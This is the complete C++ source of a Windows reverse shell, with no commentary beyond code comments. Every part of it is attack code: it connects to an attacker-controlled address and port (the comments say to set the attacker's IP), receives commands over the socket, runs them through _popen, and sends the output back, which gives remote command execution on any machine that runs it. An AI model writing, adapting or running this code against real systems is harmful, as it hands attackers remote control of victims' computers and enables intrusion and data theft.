#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <string>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

#define LHOST "127.0.0.1"  // Change this to the attacker's IP address
#define LPORT 4444          // Change this to the attacker's listening port

void shell(SOCKET socket) {
    char buffer[1024];
    int bytesReceived;

    while (true) {
        ZeroMemory(buffer, sizeof(buffer));
        
        // Receive command from the attacker
        bytesReceived = recv(socket, buffer, sizeof(buffer), 0);
        if (bytesReceived <= 0) {
            break;  // Connection lost
        }

        // Execute the command
        FILE *fp;
        fp = _popen(buffer, "r");
        if (fp == NULL) {
            send(socket, "Failed to execute command\n", 25, 0);
        } else {
            while (fgets(buffer, sizeof(buffer), fp) != NULL) {
                send(socket, buffer, strlen(buffer), 0);
            }
            _pclose(fp);
        }
    }
}

int main() {
    WSADATA wsaData;
    SOCKET connSocket;
    struct sockaddr_in serverAddr;

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed" << std::endl;
        return 1;
    }

    // Create socket
    connSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (connSocket == INVALID_SOCKET) {
        std::cerr << "Socket creation failed" << std::endl;
        WSACleanup();
        return 1;
    }

    // Set up the server address structure
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(LPORT);
    serverAddr.sin_addr.s_addr = inet_addr(LHOST);

    // Connect to the attacker's machine
    if (connect(connSocket, (struct sockaddr *)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        std::cerr << "Connection failed" << std::endl;
        closesocket(connSocket);
        WSACleanup();
        return 1;
    }

    // Start the shell
    shell(connSocket);

    // Clean up
    closesocket(connSocket);
    WSACleanup();

    return 0;
}
